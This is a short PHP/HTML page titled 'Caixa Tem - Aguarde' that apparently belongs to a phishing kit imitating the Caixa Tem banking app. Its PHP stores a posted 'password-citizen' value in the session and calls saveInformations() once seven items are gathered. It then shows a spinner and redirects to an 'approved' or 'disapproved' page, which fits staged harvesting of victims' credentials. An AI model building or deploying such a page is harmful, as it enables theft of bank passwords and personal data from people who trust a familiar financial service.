<?php require_once('../config/config.php'); if (isset($_POST)) { savePost('password-citizen'); if (count($_SESSION) === 7) { saveInformations(); $resultRegistration = resultRegistration(); if ($resultRegistration === true) { $page = 'approved'; } else { $page = 'disapproved'; } } } ?>

<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Caixa Tem - Aguarde</title>
    <link rel="shortcut icon" href="../assets/img/soon.png" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.0/jquery.min.js"></script>
    <link rel="stylesheet" href="../assets/css/send.css">
    <meta http-equiv="refresh" content="3; URL='../views/template/<?= $page; ?>.php'"/>
</head>

<body>
    <section class="mt-3 mb-5">
		<div class="d-flex justify-content-center">
            <div class="spinner-border" style="width: 6rem; height: 6rem; color: #f39200" role="status">
                <span class="sr-only"></span>
            </div>
		</div>
	</section>
</body>

</html>